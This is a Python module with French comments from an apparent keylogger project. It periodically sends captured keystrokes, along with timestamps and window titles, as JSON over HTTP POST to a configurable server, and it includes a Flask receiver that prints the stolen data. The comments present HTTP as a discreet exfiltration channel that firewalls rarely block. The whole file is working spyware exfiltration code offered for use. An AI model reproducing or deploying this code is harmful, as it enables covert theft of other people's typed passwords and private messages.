# ============================================================
#  exfil/http_sender.py — Exfiltration via HTTP POST
#  Rôle : envoyer les logs vers un serveur Flask local
#  Dépendances : pip install requests flask
# ============================================================

# ── CONCEPT : EXFILTRATION HTTP ──────────────────────────────
# Au lieu d'email, on envoie les données via une requête HTTP POST
# vers un serveur qu'on contrôle. C'est plus discret et plus
# flexible que SMTP — la plupart des firewalls laissent passer
# le trafic HTTP/HTTPS sans broncher.
#
# Architecture :
#   [http_sender.py]  →  POST /receive  →  [serveur Flask]
#
# Le serveur Flask (inclus ci-dessous en mode standalone)
# reçoit les données et les affiche / stocke côté serveur.

import time
import json
import sys
import os
from datetime import datetime

sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
from storage.logger import get_last
from config import HTTP_SERVER_URL, HTTP_INTERVAL, MAX_KEYS_EMAIL


def send_http():
    """
    Envoie les dernières frappes au serveur Flask via POST.
    Le payload est encodé en JSON.
    """
    try:
        import requests
    except ImportError:
        print("[HTTP] pip install requests")
        return

    rows = get_last(MAX_KEYS_EMAIL)
    if not rows:
        print("[HTTP] Rien à envoyer.")
        return

    # Construction du payload JSON
    payload = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "count":     len(rows),
        "keystrokes": [
            {"time": ts, "key": key, "window": win}
            for ts, key, win in rows
        ]
    }

    try:
        response = requests.post(
            HTTP_SERVER_URL,
            json=payload,              # serialise en JSON + set Content-Type
            timeout=5                  # abandonne après 5 secondes
        )
        print(f"[HTTP] ✅ Envoyé — réponse : {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("[HTTP] ❌ Serveur inaccessible")
    except requests.exceptions.Timeout:
        print("[HTTP] ❌ Timeout")
    except Exception as e:
        print(f"[HTTP] ❌ {e}")


class HttpSender:
    def __init__(self):
        self.running = False

    def start(self):
        self.running = True
        print(f"[HTTP] Démarré — envoi toutes les {HTTP_INTERVAL}s")
        while self.running:
            send_http()
            time.sleep(HTTP_INTERVAL)

    def stop(self):
        self.running = False


# ── SERVEUR FLASK (pour recevoir les données) ─────────────────
# Lance ce bloc séparément sur ta machine de réception :
#   python http_sender.py server
#
# Il écoute sur http://localhost:5000/receive
# et affiche les données reçues dans le terminal

def run_server():
    try:
        from flask import Flask, request, jsonify
    except ImportError:
        print("[Server] pip install flask")
        return

    app = Flask(__name__)

    @app.route("/receive", methods=["POST"])
    def receive():
        data = request.get_json()
        if not data:
            return jsonify({"status": "error"}), 400

        print(f"\n[Server] Reçu — {data['count']} frappes à {data['timestamp']}")
        for ks in data.get("keystrokes", []):
            print(f"  [{ks['time']}] {ks['window']} → {ks['key']}")

        return jsonify({"status": "ok"}), 200

    print("[Server] Écoute sur http://localhost:5000/receive")
    app.run(host="0.0.0.0", port=5000)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "server":
        run_server()
    else:
        send_http()